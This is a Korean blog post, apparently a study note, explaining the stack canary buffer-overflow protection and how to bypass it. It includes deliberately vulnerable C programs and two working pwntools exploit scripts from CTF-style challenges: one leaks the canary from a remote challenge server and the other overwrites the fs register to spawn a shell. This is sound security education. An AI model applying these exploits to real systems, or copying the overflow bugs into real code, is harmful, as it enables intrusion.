---
tistoryBlogName: k0n9
tistoryTitle: Canary
tistoryVisibility: "0"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "20"
tistoryPostUrl: https://k0n9.tistory.com/20
---
## Stack Canary란?

스택에서 발생하는 BOF를 탐지하는 보호기법이다.
BOF 자체를 막지는 못하지만 BOF가 발생했을 때 이를 탐지하여 프로그램을 종료시키는 방식으로 BOF 공격을 방지한다.

## 원리

우선 Stack Canary가 활성화 되어있을 경우 stack은 이런 식이다.

![](https://i.imgur.com/1n8fnFK.png)


Stack Canary는 지역변수 공간과 SFP 사이에 저장된다(rbp-0x08, 64비트 기준). Stack Canary가 적용했을 때 함수의 프롤로그는 기본적으로 이렇다.

```python
endbr64
push rbp
mov rbp, rsp
sub  rsp, 0x30
mov rax, QWORD PTR fs:0x28
mov QWORD PTR [rbp-0x8], rax
```

fs:0x28에는 Master Canary라 부르고 이 값을 rax에 저장하고 rbp-0x8위치에 저장을 한 것이 Stack Canary라고 부른다. Master Canary는 랜덤으로 설정되고 프로그램 실행중에는 canary값이 바뀌지 않는다. 함수의 에필로그를 보자.

```python
mov rdx, QWORD PTR [rbp-0x8]
sub rdx, QWORD PTR fs:0x28
je    0x121c <main+121>
call 0x1080 <__stack_chk_fail@plt>
leave
ret
```

에필로그에는 ret명령이 실행되기 전에 Stack Canary를 rdx에 저장하고 이를 Master Canary에 sub한다.

## BOF가 발생하면?

만약 버퍼오버플로우가 발생 한다면 RET가 변조될텐데 RET이 변조되려면 buffer를 넘어 Stack Canary를 변조시키고 SFP를 변조시킨 후 RET에 도착을 하여 RET값이 변조될 것이다. 만약 Master Canary와 Stack Canary 둘이 같아서 결과가 0이면 je명령으로 점프를 하고 다르면 0이 아닌 값이 나오기에 점프를 하지 않고 \_\_stack_chk_fail@plt 함수를 실행한다. 즉 이 함수가 호출된다는 것은 Stack Canary가 변조, 즉 BOF가 일어났다는 것이고 에러를 발생시키며 프로세스를 종료시킨다.

canary는 Random  canary 와 Terminator canary로 나뉜다.
##### Radom canary
랜덤하게 생성되는 canary이다.

##### Terminator canary
문자열의 끝문자로 주로 사용되는 문자들인 NULL, CR, LF, 0xFF의 조합으로 canary를 만든다. 공격자는 공격시 종료문자로 만들어진 canary 값을 입력해야 해서 SFP와 RET에 접근할 수 없다.

## Canary 우회
Stack canary 우회에는 canary leak, 브루트 포스, TLS 접근 이 있다.
### Canary leak
Canary leak이란 스택에 저장된 카나리 값이 유출이 되는 것이다. 스택에는 buf, canary, rbp, ret 순으로 되어있는데 canary의 가장 앞 부분은 널값으로 되어있다. 이때 변수와 변수 사이에 널바이트가 없으면 이어져 문자열이 출력된다. canary의 첫 1byte는 널값인데 buf를 꽉채우고 1바이트를 더 추가하면 버퍼오버플로우가 일어나 canary의 앞에 1byte널값이 채워진다. 이때 buf값을 출력하면 buf와 canary사이에 null값이 없어 canary 값 까지 출력되게 하는 것이다.

### 브루트 포스
랜덤 카나리 값을 무차별 대입한다.

### TLS 접근
마스터 카나리는 TLS(전송 보안 계층으로 여러 스레드를 저장)에 전역변수로 저장되어있어 TLS에 접근하여 카나리 값을 읽어내거나 변조하는 것이다.

## 예제
```C
#include <stdio.h>
  
void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}
  
int main(){
    setup_environment();
  
    char buf[0x20] = {0,};
  
    read(0, buf, 0x40);

	printf("%s", buf);
	
    return 0;
}
```
예제코드는 다음과 같다. 

a를 여러개 입력해보자.
![](https://i.imgur.com/Qg48FUO.png)
stack smashing detected 가 발생하면서 종료된다.
![](https://i.imgur.com/pnfen9e.png)
buffer는 0x28 크기인것을 확인할 수 있다. 29개를 입력해보자.
![](https://i.imgur.com/wVKOc16.png)
canary 가 leak 된 것을 확인할 수 있다.

## 예제 __ 새싹챌린지
```C
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
  
void print_flag() {
    int fd = open("flag", O_RDONLY);
    if (fd == -1) {
        return;
    }
    char flag[0x40] = { '\0' };
    if (!read(fd, flag, 0x3f)) {
        close(fd);
        return;
    }
    flag[strlen(flag)] = '\n';
    write(1, flag, strlen(flag));
    close(fd);
}
  
void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
  
int main() {
    setup_environment();
    char input[0x48] = { '\0' };
    printf("[+] Y0u kn0w c4n4ry?\n");
    printf("> ");
    read(0, input, 0x49);
    printf("[+] H0...? [%s] 1 c4n't und3rst4nd\n", input);
    printf("[+] C4n y0u t3ll m3 4g41n?\n");
    printf("> ");
    read(0, input, 0x70);
    printf("[+] H0...? 1 st1ll d0n't und3rst4nd\n");
    printf("[+] By3 By3\n");
    return 0;
}
```
![](https://i.imgur.com/ptKwlzh.png)

카나리가 걸려있는것을 알 수 있다.

문제에서 input에 overflow를 발생시켜서 canary leak을 하고 두번째 입력에 input + canary + sfp + print_flag_add 를 입력하면 된다.

```C
from pwn import *
  
# context.log_level = 'debug'
  
# p = process("./canary")
p = remote("211.229.218.12", 33015)
  
dum = b'a'*0x48 + b'b'
p_flag = 0x401236
  
p.sendafter("> ", dum)
  
p.recvuntil(b"ab")
  
canary = u64(b'\x00'+p.recv(7))
  
ex = b'a'*0x48 + p64(canary) + b'b'*0x8 + p64(p_flag)
 
p.sendafter("> ", ex)
  
p.interactive()
```

![](https://i.imgur.com/Zfi5o7B.png)

flag를 획득할 수 있다.

### 예제 __ 제공 문제


checksec
![](https://i.imgur.com/p5eRiUM.png)

canary가 걸려있는것을 알 수 있다.
![](https://i.imgur.com/uLxmHLI.png)

우선 read로 memo에 값을 입력받는데 main에 선언이 안되어있으니 전역변수로 선언되었을것이다. 그리고 memset을 해준 후 read로 s 배열에 입력을 받는데 overflow가 일어난다. 그리고 v6가 -559038737, 16진수로 하면 0xdeadbeef 일 경우 arch_prctl 함수를 실행하는데 이것은 레지스터의 값을 v5로 바꾸는 함수로 4098인 경우 fs 레지스터의 값을 바꾼다.

카나리는 fs를 참조하여 값을 비교하니 이 fs를 memo로 바꿔서 canary 보호기법을 우회할 수 있다.

```c
from pwn import *
  
p = process("./chall")
  
getshell = 0x4011b6
memo = 0x0000000000404080
ret = 0x401289
  
me = p64(memo)
me += p64(memo)
me += p64(memo)
me += b'\x00'*0x100
p.send(me)
  
sleep(1)
  
ex = b'a'*0x30
ex += p64(memo)
ex += p64(0xdeadbeef)
ex += p64(0)
ex += p64(0) # canary
ex += p64(0) # sfp
ex += p64(ret)
ex += p64(getshell)
p.send(ex)
  
p.interactive()
```
우선 memo에 자신의 주소를 3번 적는다. 이렇게 하지 않을 경우 이후 system 내부에서 fs를 참조할때 fs:0x10을 참조하는데 이때 오류가 발생할 수 있다. 그래서 memo에 memo의 주소를 적고 적당한 값 0x100 만큼 0을 적는다.
그리고 2번째 read에서 buffer 의 크기인 0x30을 채우고 v5에는 fs를 바꿀 값을 적어야 하니 memo의 주소로 한다. 그리고 v6가 0xdeadbeef여야 하니 0xdeadbeef를 적고 canary는 memo에 0으로 적어두었으니 0으로 적는다. 그리고 스택 정렬을 위해 ret을 적고 getshell을 넣어주면 getshell이 실행된다.

![](https://i.imgur.com/f9TzNWL.png)
